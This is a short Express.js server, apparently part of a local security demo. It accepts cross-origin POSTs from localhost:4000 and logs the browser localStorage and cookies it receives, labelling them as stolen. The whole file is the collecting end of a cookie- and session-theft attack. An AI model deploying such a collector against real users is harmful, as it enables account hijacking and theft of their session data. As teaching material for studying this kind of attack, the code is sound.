const express = require('express')
const cors = require('cors')
const bodyParser = require('body-parser')

const app = express()
const port = 5000
app.use(cors({ origin: 'http://localhost:4000', credentials: true }))
app.use(bodyParser.json())

app.post('*', (req, res) => {
  console.log('-------------------')
  console.log(`Stole localStorage: ${req.body.localStorage}`)
  console.log(`Stole cookies: ${req.body.cookies}`)
  res.status(200)
})

app.listen(port)
